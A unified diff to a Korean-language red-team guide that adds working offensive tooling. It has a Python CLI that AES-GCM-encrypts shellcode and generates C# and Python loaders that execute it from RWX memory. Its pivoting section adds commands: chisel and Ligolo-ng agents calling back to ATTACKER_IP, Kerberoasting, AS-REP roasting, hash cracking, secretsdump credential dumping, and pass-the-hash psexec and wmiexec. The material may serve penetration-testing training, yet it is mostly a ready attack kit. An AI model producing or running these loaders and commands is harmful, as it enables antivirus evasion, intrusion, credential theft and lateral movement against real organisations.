@@ -322,82 +322,163 @@ NtSetInformationProcess(
 
 ```python
 #!/usr/bin/env python3
-"""Shellcode 암호화 및 로더 생성"""
+"""
+Shellcode 암호화 및 C#/Python 로더 생성 CLI (AES-256-GCM 사용)
+사용: python3 shellcode_encrypt.py encrypt --input shellcode.bin --output loader.cs --lang csharp
+      python3 shellcode_encrypt.py encrypt --input shellcode.bin --output loader.py  --lang python
+      python3 shellcode_encrypt.py encrypt --input shellcode.bin --hex-only
+"""
 
+from __future__ import annotations
+import argparse
 import os
-import struct
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
+import sys
+from pathlib import Path
 
-def encrypt_shellcode(shellcode: bytes) -> tuple:
-    """AES-256-CBC로 Shellcode 암호화"""
-    key = os.urandom(32)
-    iv = os.urandom(16)
-    
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    encrypted = cipher.encrypt(pad(shellcode, 16))
-    
-    return key, iv, encrypted
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    print("[-] pycryptodome 필요: pip install pycryptodome", file=sys.stderr)
+    sys.exit(1)
 
-def generate_csharp_loader(key: bytes, iv: bytes, shellcode: bytes) -> str:
-    """C# 로더 코드 생성"""
-    
-    key_hex = ', '.join([f'0x{b:02x}' for b in key])
-    iv_hex = ', '.join([f'0x{b:02x}' for b in iv])
-    sc_hex = ', '.join([f'0x{b:02x}' for b in shellcode])
-    
-    template = f"""
+
+def encrypt_shellcode_gcm(shellcode: bytes) -> tuple[bytes, bytes, bytes, bytes]:
+    """
+    AES-256-GCM으로 shellcode 암호화 (AEAD — 무결성 검증 포함)
+    반환: (key, nonce, ciphertext, tag)
+    """
+    key   = os.urandom(32)   # 256-bit
+    nonce = os.urandom(12)   # 96-bit GCM 권장
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    ciphertext, tag = cipher.encrypt_and_digest(shellcode)
+    return key, nonce, ciphertext, tag
+
+
+def hex_array(data: bytes, var: str, indent: int = 8) -> str:
+    pad = " " * indent
+    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
+    return f"{pad}byte[] {var} = {{ {hex_vals} }};"
+
+
+def generate_csharp_loader(key: bytes, nonce: bytes,
+                            ct: bytes, tag: bytes) -> str:
+    """AES-256-GCM C# 로더 — BouncyCastle 또는 .NET 내장 AesGcm 사용"""
+    return f"""\
 using System;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
+// 빌드: csc /optimize+ /unsafe loader.cs
 class Loader {{
     [DllImport("kernel32.dll")]
-    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
-        uint flAllocationType, uint flProtect);
-    
+    static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
     [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
-        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
-        IntPtr lpThreadId);
-    
+    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f,
+        IntPtr p, uint c, IntPtr id);
     [DllImport("kernel32.dll")]
-    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    
+    static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
     static void Main() {{
-        byte[] key = {{ {key_hex} }};
-        byte[] iv = {{ {iv_hex} }};
-        byte[] encryptedShellcode = {{ {sc_hex} }};
-        
-        // 복호화
-        using (Aes aes = Aes.Create()) {{
-            aes.Key = key;
-            aes.IV = iv;
-            aes.Mode = CipherMode.CBC;
-            
-            using (var decryptor = aes.CreateDecryptor()) {{
-                byte[] shellcode = decryptor.TransformFinalBlock(
-                    encryptedShellcode, 0, encryptedShellcode.Length);
-                
-                // 메모리 할당 및 실행
-                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
-                    0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
-                
-                Marshal.Copy(shellcode, 0, addr, shellcode.Length);
-                
-                IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, 
-                    IntPtr.Zero, 0, IntPtr.Zero);
-                
-                WaitForSingleObject(thread, 0xFFFFFFFF);
-            }}
+{hex_array(key,   "key")}
+{hex_array(nonce, "nonce")}
+{hex_array(ct,    "ciphertext")}
+{hex_array(tag,   "tag")}
+
+        byte[] shellcode = new byte[ciphertext.Length];
+
+        // AES-256-GCM 복호화 + 인증 (.NET 5+)
+        using (var gcm = new AesGcm(key, 16)) {{
+            gcm.Decrypt(nonce, ciphertext, tag, shellcode);
         }}
+
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
+            0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
+        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+        var t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(t, 0xFFFFFFFF);
     }}
 }}
 """
-    return template
 
-# msfvenom으로 shellcode 생성 후 암호화
-# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f raw -o shellcode.bin
+
+def generate_python_loader(key: bytes, nonce: bytes,
+                            ct: bytes, tag: bytes) -> str:
+    """AES-256-GCM Python 로더 (ctypes 기반, Windows 전용)"""
+    return f"""\
+#!/usr/bin/env python3
+\"\"\"AES-256-GCM Python 셸코드 로더 — Windows 전용 (ctypes)\"\"\"
+import ctypes, sys
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    sys.exit("pip install pycryptodome")
+
+KEY   = bytes.fromhex("{key.hex()}")
+NONCE = bytes.fromhex("{nonce.hex()}")
+CT    = bytes.fromhex("{ct.hex()}")
+TAG   = bytes.fromhex("{tag.hex()}")
+
+cipher = AES.new(KEY, AES.MODE_GCM, nonce=NONCE)
+shellcode = cipher.decrypt_and_verify(CT, TAG)
+
+MEM_COMMIT  = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_EXEC_RW = 0x40
+
+k32 = ctypes.windll.kernel32
+addr = k32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXEC_RW)
+ctypes.memmove(addr, shellcode, len(shellcode))
+h = k32.CreateThread(None, 0, addr, None, 0, None)
+k32.WaitForSingleObject(h, -1)
+"""
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Shellcode 암호화 로더 생성")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    enc = sub.add_parser("encrypt", help="shellcode 암호화 후 로더 생성")
+    enc.add_argument("--input",  type=Path, required=True, help="shellcode 바이너리")
+    enc.add_argument("--output", type=Path, help="출력 파일")
+    enc.add_argument("--lang",   choices=["csharp", "python"], default="csharp")
+    enc.add_argument("--hex-only", action="store_true",
+                     help="로더 생성 없이 key/nonce/ct/tag 만 출력")
+
+    args = parser.parse_args()
+
+    if args.cmd == "encrypt":
+        raw = args.input.read_bytes()
+        key, nonce, ct, tag = encrypt_shellcode_gcm(raw)
+        print(f"[*] shellcode: {len(raw)} bytes → {len(ct)} bytes (암호화)")
+        print(f"    key   : {key.hex()}")
+        print(f"    nonce : {nonce.hex()}")
+        print(f"    tag   : {tag.hex()}")
+
+        if args.hex_only:
+            return
+
+        if args.lang == "csharp":
+            code = generate_csharp_loader(key, nonce, ct, tag)
+        else:
+            code = generate_python_loader(key, nonce, ct, tag)
+
+        if args.output:
+            args.output.write_text(code)
+            print(f"[+] 로더 저장: {args.output}")
+        else:
+            print(code)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        # 데모: NOP sled 암호화
+        dummy = b"\x90" * 64 + b"\xcc"   # NOP sled + INT3
+        k, n, c, t = encrypt_shellcode_gcm(dummy)
+        print(f"[Demo] {len(dummy)}B shellcode 암호화 완료")
+        print(f"  key={k.hex()}\n  nonce={n.hex()}\n  tag={t.hex()}")
+    else:
+        main()
 ```
 
 ---
@@ -407,30 +488,60 @@ class Loader {{
 ### SOCKS 프록시를 통한 피벗
 
 ```bash
-# chisel로 SOCKS 터널
-# 공격자 서버
-./chisel server -p 8080 --reverse
+# ── chisel SOCKS 터널 ──────────────────────────────────────
+# 공격자 서버 (리버스 SOCKS5)
+./chisel server -p 8080 --reverse --socks5
 
-# 피해자 시스템
-./chisel client ATTACKER_IP:8080 R:socks
+# 피해자 시스템 (에이전트)
+./chisel client ATTACKER_IP:8080 R:1080:socks
 
 # proxychains 설정
 echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+proxychains nmap -sT -Pn -p 22,80,443,445,3389 192.168.10.0/24
 
-# 내부 네트워크 도구 사용
-proxychains nmap -sT -Pn 192.168.1.0/24
-proxychains python3 secretsdump.py domain/user@internal_dc
+# ── Impacket 내부 망 정찰 (proxychains 경유) ──────────────
+# 도메인 내 사용자 열거
+proxychains impacket-GetADUsers -all DOMAIN/USER:PASS -dc-ip 192.168.10.1
 
-# SSH 동적 포트 포워딩
-ssh -D 1080 -N user@pivot_host
+# Kerberoasting (SPN 서비스 계정 해시 수집)
+proxychains impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip 192.168.10.1 \
+    -request -outputfile kerberoast.txt
 
-# Ligolo-ng (고성능 피벗)
-# 서버 (공격자)
-./proxy -selfcert
-# 에이전트 (피해자)
+# hashcat으로 TGS 해시 크래킹
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
+        -r /usr/share/hashcat/rules/best64.rule
+
+# AS-REP Roasting (사전 인증 비활성 계정)
+proxychains impacket-GetNPUsers DOMAIN/ -usersfile users.txt \
+    -format hashcat -outputfile asrep.txt -dc-ip 192.168.10.1
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# secretsdump — 원격 자격증명 덤프
+proxychains impacket-secretsdump DOMAIN/Administrator:PASS@192.168.10.5
+# Pass-the-Hash 방식
+proxychains impacket-secretsdump -hashes ':NTLM_HASH' \
+    DOMAIN/Administrator@192.168.10.5
+
+# PSExec — 관리자 쉘 획득
+proxychains impacket-psexec -hashes ':NTLM_HASH' \
+    DOMAIN/Administrator@192.168.10.5 cmd.exe
+
+# WMI 원격 실행
+proxychains impacket-wmiexec -hashes ':NTLM_HASH' \
+    DOMAIN/Administrator@192.168.10.5 'whoami /all'
+
+# ── Ligolo-ng (고성능 피벗) ────────────────────────────────
+# 공격자 (프록시 서버)
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# 피해자 (에이전트)
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
-# 인터페이스 생성
->> tunnel_start --tun ligolo
+
+# 공격자 프록시에서 터널 시작
+ligolo-ng >> session                    # 세션 선택
+ligolo-ng >> tunnel_start --tun ligolo  # 터널 활성화
+# 라우팅 추가
+sudo ip route add 192.168.10.0/24 dev ligolo
 ```
 
 ### 더블 피벗 (두 단계 중간 시스템)
